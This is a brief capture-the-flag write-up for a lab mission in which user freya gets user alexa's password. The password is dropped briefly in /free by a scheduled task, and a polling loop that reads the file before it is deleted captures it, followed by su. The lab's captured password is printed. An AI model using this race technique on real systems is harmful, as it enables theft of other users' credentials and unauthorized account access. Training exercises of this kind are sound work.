# 0x25
This write-up explains the steps taken to complete mission 0x25, starting from user `freya` and escalating to `alexa`.

## Mission
As always, read the mission first:
```bash
freya@venus:~$ cat mission.txt 
################
# MISSION 0x25 #
################

## EN ##
User alexa puts her password in a .txt file in /free every minute and then deletes it. 
```
 
## Method of solving
We checked the /free directory, but is was empty because the file is deleted almost immediately after being created by a scheduled task.
```bash
freya@venus:~$ ls -la /free/
total 8
drwxrwxr-x 1 executor executor 4096 Jan 30 21:16 .
drwxr-xr-x 1 root     root     4096 Aug 14 06:42 ..
```
To catch the password, I needed to run a loop that constantly tries to read any `.txt` file in that directory. We use a `while` loop that continues unitl it successfully reads the file and then stops.
```bash
freya@venus:~$ while true; do cat /free/*.txt 2>/dev/null && break; done
mxq9O3MSxxX9Q3S
```
Verify this password by switching user to `alexa` and get the flag.
```bash
freya@venus:~$ su - alexa
Password: 
alexa@venus:~$ id ; whoami
uid=1026(alexa) gid=1026(alexa) groups=1026(alexa)
alexa
```

## Key command	
`while true; do cat /free/*.txt 2>/dev/null && break; done`

***You are welcome!***
